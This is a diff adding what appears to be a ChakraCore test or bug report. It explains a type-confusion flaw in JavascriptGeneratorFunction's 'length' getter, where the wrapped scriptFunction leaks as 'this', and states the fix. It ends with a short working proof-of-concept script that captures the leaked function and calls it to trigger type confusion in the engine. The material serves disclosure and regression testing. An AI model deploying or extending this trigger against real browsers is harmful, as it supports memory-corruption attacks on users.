@@ -1,0 +1,39 @@
+/*
+Here's a snippet of the method.
+bool JavascriptGeneratorFunction::GetPropertyBuiltIns(Var originalInstance, PropertyId propertyId, Var* value, PropertyValueInfo* info, ScriptContext* requestContext, BOOL* result)
+{
+    if (propertyId == PropertyIds::length)
+    {
+        ...
+        int len = 0;
+        Var varLength;
+        if (scriptFunction->GetProperty(scriptFunction, PropertyIds::length, &varLength, NULL, requestContext))
+        {
+            len = JavascriptConversion::ToInt32(varLength, requestContext);
+        }
+        ...
+        return true;
+    }
+
+    return false;
+}
+
+"JavascriptGeneratorFunction" is like a wrapper class used to ensure the arguments for "scriptFunction". So "scriptFunction" must not be exposed to user JavaScript code. But the vulnerable method exposes "scriptFunction" as "this" when getting the "length" property.
+
+The code should be like: "scriptFunction->GetProperty(this, PropertyIds::length, &varLength, NULL, requestContext);"
+
+Type confusion PoC:
+*/
+
+function* f() {
+}
+
+let g;
+f.__defineGetter__('length', function () {
+    g = this;  // g == "scriptFunction"
+});
+
+
+f.length;
+
+g.call(0x1234, 0x5678);  // type confusion
